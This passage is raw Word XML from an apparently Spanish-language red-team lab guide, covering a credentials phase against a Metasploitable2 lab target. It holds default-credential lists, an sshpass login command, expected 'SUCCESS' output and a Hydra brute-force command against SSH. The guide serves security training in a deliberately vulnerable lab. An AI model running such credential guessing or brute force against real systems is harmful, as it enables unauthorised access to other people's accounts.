          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B76B847" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Objetivo:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Obtener acceso autenticado a servicios usando credenciales por defecto conocidas de Metasploitable2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148864B2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>7.1 Credenciales por defecto (ejecutar primero)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8BBF87" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-4-credentials/default-creds.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3F8718" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="032E7086" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279F7F20" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>El script prueba 7 pares de credenciales conocidas de Metasploitable2 contra SSH y FTP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDCBC2E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>msfadmin:msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2B2BFB1E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>root:root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514D6F89" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>admin:admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BCB91B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>user:user</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3D160E96" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>postgres:postgres</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="123A58CD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>service:service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="636D6ED0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>vagrant:vagrant</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="78410032" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70B167CF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Para SSH usa los </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>flags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> necesarios para conectarse a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>OpenSSH</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4.7p1 (protocolo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>legacy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E874E5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sshpass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>" ssh \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D96968" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -o KexAlgorithms=+diffie-hellman-group1-sha1 \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FAD8A0E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -o "MACs=+hmac-md5,hmac-sha1" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F961BAA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">-o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>HostKeyAlgorithms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>ssh-rsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB04E21" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">    172.20.0.20 "id"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B22E1D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="189FFE7B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Resultado</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>esperado</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF27665" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Trying SSH  msfadmin:msfadmin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB4E5FF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ssh,msfadmin,msfadmin,SUCCESS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E8314B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Trying FTP  msfadmin:msfadmin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B7D2ED" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ftp,msfadmin,msfadmin,SUCCESS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5723AF47" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F082743" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Summary of successful logins:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D70178" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ssh,msfadmin,msfadmin,SUCCESS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4160210D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ftp,msfadmin,msfadmin,SUCCESS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE0BC00" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>ssh,user</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>user,SUCCESS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0B992265" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CC940BB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">7.2 Brute </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>force</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> con Hydra (opcional si default-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>creds</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> no encuentra nada)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC4F6B7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-4-credentials/brute-force.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62398778" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="540F0140" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Qué hace:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAFDB5A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>hydra -L /usr/share/wordlists/metasploit/unix_users.txt \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7EE324" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">      -P passwords-100.txt \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDC8E94" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">      -t 4 -V -f \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4156ADF0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>ssh://172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355BB8DD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ACFC69C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
